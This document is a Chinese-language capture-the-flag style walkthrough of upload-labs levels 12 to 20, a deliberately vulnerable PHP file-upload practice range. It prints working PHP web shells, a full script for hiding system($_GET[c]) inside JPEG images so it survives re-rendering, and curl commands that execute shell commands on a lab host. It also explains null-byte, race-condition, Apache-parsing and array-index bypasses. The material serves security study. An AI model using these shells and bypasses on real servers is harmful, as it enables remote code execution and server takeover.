+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119130028765.png" alt="image-20210119130028765"></p>
+<p>看下源码</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119131508849.png" alt="image-20210119131508849"></p>
+<p>file_ext根据白名单过滤剩下图片格式</p>
+<p>然后通过POST里的save_path直接拼接出保存路径，重命名</p>
+<p>move_uploaded_file的底层对于字符串会在00的位置截断</p>
+<h1 id="Pass-13-图片马检查magic-number"><a href="#Pass-13-图片马检查magic-number" class="headerlink" title="Pass-13-图片马检查magic number"></a>Pass-13-图片马检查magic number</h1><p>要求传图片马，并且可以被文件包含漏洞利用</p>
+<p>copy命令即可，然后自己复制个include.php去upload目录，包含一下完事</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">test pic trojan</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>完事</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119133721078.png" alt="image-20210119133721078"></p>
+<p>看下源码</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119134937759.png" alt="image-20210119134937759"></p>
+<p>就检查头2个字节</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119134957746.png" alt="image-20210119134957746"></p>
+<p>然后根据类型重新设置文件扩展名</p>
+<h1 id="Pass-14-图片马getimagesize-gt-0"><a href="#Pass-14-图片马getimagesize-gt-0" class="headerlink" title="Pass-14-图片马getimagesize&gt;=0"></a>Pass-14-图片马getimagesize&gt;=0</h1><p>copy一样ok</p>
+<p>看下源码</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119135133855.png" alt="image-20210119135133855"></p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119135730085.png" alt="image-20210119135730085"></p>
+<p>用了file_exists函数检查文件是否存在？（防止burp改名？）</p>
+<p>然后获取扩展名，判断jpeg，gif，png是否存在于扩展名中</p>
+<p>存在就上传</p>
+<h1 id="Pass-15-类型检查exif-imagetype"><a href="#Pass-15-类型检查exif-imagetype" class="headerlink" title="Pass-15-类型检查exif_imagetype"></a>Pass-15-类型检查exif_imagetype</h1><p>同13</p>
+<p>copy即可</p>
+<p>看源码</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119140104890.png" alt="image-20210119140104890"></p>
+<p>用了exif_imagetype函数</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119140220038.png" alt="image-20210119140220038"></p>
+<p>isImage返回类型字符串，拼接重命名上传</p>
+<h1 id="Pass-16-二次渲染"><a href="#Pass-16-二次渲染" class="headerlink" title="Pass-16-二次渲染"></a>Pass-16-二次渲染</h1><p>提示是二次渲染</p>
+<h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>传个gif图片马，发现连不上，下载回来一看末尾添加的一句话已经被删了，文件大小也缩了很多</p>
+<p>尝试往不变的地方添加一句话，发现还是开头处有一串点，那里可以替换为一句话</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119165443656.png" alt="image-20210119165443656"></p>
+<p>上传后下回来，发现ok了没被删</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119165508627.png" alt="image-20210119165508627"></p>
+<h2 id="png"><a href="#png" class="headerlink" title="png"></a>png</h2><p>一个现成的png，原理是IDAT，内容是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$_GET[0]($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>图片如下</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/get-0-post-1.png" alt="get-0-post-1"></p>
+<p>用的办法比较复杂，需要使用这条命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST &quot;http://192.168.189.128/upload/include.php?file=18200.png&amp;0=shell_exec&quot; -d &quot;1=dir&quot; --output cc.txt</span><br></pre></td></tr></table></figure>
+<p>解释一下，就是向目标<code>http://192.168.189.128/upload/include.php?file=18200.png</code>，把目标当成php包含，然后传递GET[0]=shell_exec，POST[1]=dir这两个参数，结果保存到本地cc.txt中</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210120223241806.png" alt="image-20210120223241806"></p>
+<hr>
+<p>另一个原理是PLTE，内容是phpinfo</p>
+<p>不知道怎么改</p>
+<p>相关文章</p>
+<p><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" target="_blank" rel="noopener">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p>
+<p><a href="https://www.cnblogs.com/forforever/p/13191999.html" target="_blank" rel="noopener">https://www.cnblogs.com/forforever/p/13191999.html</a></p>
+<p><a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-13</a></p>
+<p>文件上传的配合</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/20190705134326-cf982650-9ee7-1.jpg" alt="img"></p>
+<h2 id="jpg-jpeg"><a href="#jpg-jpeg" class="headerlink" title="jpg/jpeg"></a>jpg/jpeg</h2><p>有国外大牛脚本，但不是都能插入成功，甚至被判定不是jpg文件格式，需要尝试不少图片，这个图是成功率比较高的，但payload不能随便改</p>
+<p>这个地址上的payload_1.jpg可以过二次渲染，并且触发phpinfo</p>
+<p><a href="https://github.com/99gg/jpg_payload_back" target="_blank" rel="noopener">https://github.com/99gg/jpg_payload_back</a></p>
+<p><img src="/2021/02/23/upload-labs学习笔记/payload_1-phpinfo.jpg" alt="payload_1"></p>
+<p>效果如下</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210121210722166.png" alt="image-20210121210722166"></p>
+<p>用这个地址上的脚本，针对上传一次后的月球图片，可以成功</p>
+<p><a href="https://github.com/BlackFan/jpg_payload/blob/master/jpg_payload.php" target="_blank" rel="noopener">https://github.com/BlackFan/jpg_payload/blob/master/jpg_payload.php</a></p>
+<p>原图片为</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/1.jpg" alt="1"></p>
+<p>但这个图片不能直接改，否则上传时会报不是jpg</p>
+<p>先传一下1.jpg，得到下面这个图片（文件缩小了）</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/1-upload.jpg" alt="1-upload"></p>
+<p>然后再运行脚本，脚本内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations</span></span><br><span class="line"><span class="comment">	caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">	It is necessary that the size and quality of the initial image are the same as those of the processed</span></span><br><span class="line"><span class="comment">	image.</span></span><br><span class="line"><span class="comment">	1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">	2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">	php jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment">	In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment">	Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">	1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">	2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another </span></span><br><span class="line"><span class="comment">	initial image.</span></span><br><span class="line"><span class="comment">	Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment">	See also:</span></span><br><span class="line"><span class="comment">	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	$miniPayload = <span class="string">'&lt;?=system($_GET[c]);?&gt;'</span>;</span><br><span class="line">	<span class="comment">/*$miniPayload = '&lt;?=`$_POST[c]`?&gt;';*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">		$nullbytePayloadSize = $pad;</span><br><span class="line">		$dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">		$outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">		$extraBytes = <span class="number">0</span>;</span><br><span class="line">		$correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">			$marker = $dis-&gt;readByte();</span><br><span class="line">			$size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">			$dis-&gt;skip($size);</span><br><span class="line">			<span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">				$startPos = $dis-&gt;seek();</span><br><span class="line">				$outStreamTmp = </span><br><span class="line">					substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">					$miniPayload . </span><br><span class="line">					str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">					substr($outStream, $startPos);</span><br><span class="line">				checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">				<span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">						<span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">							<span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">					$imageStreamSize = $stopPos - $startPos;</span><br><span class="line">					$outStream = </span><br><span class="line">						substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">						$miniPayload . </span><br><span class="line">						substr(</span><br><span class="line">							str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">								substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">							<span class="number">0</span>,</span><br><span class="line">							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">								substr($outStream, $stopPos);</span><br><span class="line">				&#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">					$outStream = $outStreamTmp;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $correctImage;</span><br><span class="line">		file_put_contents($filename, $data);</span><br><span class="line">		$correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">		imagecreatefromjpeg($filename);</span><br><span class="line">		<span class="keyword">if</span>($unlink)</span><br><span class="line">			unlink($filename);</span><br><span class="line">		<span class="keyword">return</span> $correctImage;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">		$correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">				$extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $binData;</span><br><span class="line">		<span class="keyword">private</span> $order;</span><br><span class="line">		<span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">			<span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">				<span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> ord($byte);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> $short;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>下面这个图片可以过二次渲染，内容是system($_GET[c])</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/payload-get-password-is-c.jpg" alt="payload-get-password-is-c"></p>
+<p>上传后的图片为</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/get-after-upload.jpg" alt="get-after-upload"></p>
+<p>效果图（图片名字改了）</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210121203513449.png" alt="image-20210121203513449"></p>
+<p>我改了一下，可以接POST型的系统调用，原图片也只能用月球图片</p>
+<p>这个图可以过二次渲染，内容是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_POST[c]`?&gt;</span><br></pre></td></tr></table></figure>
+<p>使用命令为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST &quot;http://192.168.189.128/upload/include.php?file=19765.jpg&quot; -d &quot;c=dir&quot; -o result.txt</span><br></pre></td></tr></table></figure>
+<p>图片马为</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/payload-post-password-is-c.jpg" alt="payload-post-password-is-c"></p>
+<p>上传后的图片为</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/post-after-upload.jpg" alt="post-after-upload"></p>
+<h1 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17-条件竞争"></a>Pass-17-条件竞争</h1><p>提示要审计代码，看源码</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133354221.png" alt="image-20210122133354221"></p>
+<p>他是先用move_uploaded_file函数上传，然后才检测是否合法，不合法就删除</p>
+<p>我们可以用条件竞争，即在他还没删掉前去访问上传的writephp.php文件，从而让writephp.php解析一次，执行的内容是将一句话写入新文件info.php，然后info.php就被曲线救国“上传”成功了</p>
+<p>writephp.php内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"info.php"</span>, <span class="string">"w"</span>), <span class="string">'&lt;?php @eval($_POST["x"]);?&gt;'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>需要用burp的intruder模块，一个负责上传writephp.php，一个负责访问writephp.php</p>
+<p>抓两个原始包，改一下</p>
+<p>这个负责上传</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133736066.png" alt="image-20210122133736066"></p>
+<p>这个负责访问</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133749429.png" alt="image-20210122133749429"></p>
+<p>添加一个变量去爆破，payload设置如下</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133832312.png" alt="image-20210122133832312"></p>
+<p>线程设置如下，都20个线程</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133901237.png" alt="image-20210122133901237"></p>
+<p>然后开始爆破，下面是结果，左边上传，右边访问，访问的出现status=200就是成功访问到了（解析了，执行了）</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122133946066.png" alt="image-20210122133946066"></p>
+<p>然后看下upload文件夹，info.php成功制造</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122134052422.png" alt="image-20210122134052422"></p>
+<p>完成</p>
+<h1 id="Pass-18-条件竞争-apache解析漏洞"><a href="#Pass-18-条件竞争-apache解析漏洞" class="headerlink" title="Pass-18-条件竞争+apache解析漏洞"></a>Pass-18-条件竞争+apache解析漏洞</h1><p>需要先改下源码，Pass-18/index.php，添加 . ‘/‘  不然文件会传到WWW目录下而不是upload目录下</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122180253314.png" alt="image-20210122180253314"></p>
+<p>看提示是代码审计，允许的后缀是这些</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122180840449.png" alt="image-20210122180840449"></p>
+<p>去apache的config路径下看mime.types文件，发现apache对7z不识别，可以考虑用解析漏洞，传一个writephp.php.7z上去访问即可解析</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122181043307.png" alt="image-20210122181043307"></p>
+<p>看下面代码，其实也是条件竞争，但是我只一直发上传包也是可以上传成功的（文件名是writephp.php.7z），我估计是多个并发上传时哪里出了问题</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122180806081.png" alt="image-20210122180806081"></p>
+<p>分析一下爆破结果，包的结果有3种</p>
+<ol>
+<li>上传成功并重命名</li>
+<li>上传成功但没有重命名</li>
+<li>无法复制到目标目录</li>
+</ol>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122181443209.png" alt="image-20210122181443209"></p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122181528157.png" alt="image-20210122181528157"></p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122181540979.png" alt="image-20210122181540979"></p>
+<p>没理解第一次成功的时候是怎么成功的。。</p>
+<h1 id="Pass-19-自定义保存文件名-黑名单"><a href="#Pass-19-自定义保存文件名-黑名单" class="headerlink" title="Pass-19-自定义保存文件名+黑名单"></a>Pass-19-自定义保存文件名+黑名单</h1><p>上传文件，可以指定文件名，比如upload-19.jpg，那么试试保存为php行吗，发现不行</p>
+<p>改下包，保存名改为phppng.php.7z，发现可以了，看来是对这个保存名进行黑名单限制</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122192419835.png" alt="image-20210122192419835"></p>
+<p>再试试发现连对传的文件内容都没限制，txt都行</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122192405106.png" alt="image-20210122192405106"></p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122192500262.png" alt="image-20210122192500262"></p>
+<p>看下源码，确实，黑名单那一套都能拿来用，就不一一列举了</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210122192559769.png" alt="image-20210122192559769"></p>
+<h1 id="Pass-20-POST定义关联数组"><a href="#Pass-20-POST定义关联数组" class="headerlink" title="Pass-20-POST定义关联数组"></a>Pass-20-POST定义关联数组</h1><p>审计源码</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123111436682.png" alt="image-20210123111436682"></p>
+<p>理一下逻辑</p>
+<ol>
+<li>检查文件类型</li>
+<li>save_name不为空，file取save_name，为空取upload_file的name</li>
+<li>如果$file不是数组，就用explode将他按点打散成数组</li>
+</ol>
+<p>那么这里如果$file是一个数组，那就不用打散了，这是关键</p>
+<p>我们可以控制save_name这个数组（关联数组）</p>
+<p>继续往下看</p>
+<p><img src="/2021/02/23/upload-labs学习笔记/image-20210123112208759.png" alt="image-20210123112208759"></p>
+<p>end(file)要求是jpg，png，gif</p>
+<p>$file_name = reset($file) . $file[count($file)-1]，这里是把file当作数值数组来看待的，但如果file是关联数组，$file[count($file)-1]可以控制一下，比如</p>
+<p>file[0] = whale</p>
+<p>file[1]不传</p>
+<p>file[2] = php</p>
+<p>file[3] = jpg</p>
+<p>这样的话，end(file) = jpg，count(file)=3，file[count-1] = file[2] = php，file_name = whale.php，就完事了</p>
